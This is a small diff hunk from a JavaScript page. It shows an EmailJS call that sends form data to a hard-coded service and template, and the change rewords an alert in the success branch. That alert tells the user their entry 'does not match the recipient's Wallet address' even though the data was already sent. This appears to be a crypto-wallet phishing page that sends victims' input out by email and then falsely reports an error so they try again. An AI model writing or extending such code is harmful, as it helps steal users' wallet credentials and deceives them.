@@ -164,7 +164,7 @@
 
             emailjs.send('service_pb8dciz', 'template_030l7kc', data)
                 .then(function() {
-                    alert('The information entered is not correct.');
+                    alert('The entered information does not match the recipient's Wallet address');
                 }, function(error) {
                     console.error('Error occurred:', error);
                     alert('Error: ' + JSON.stringify(error));
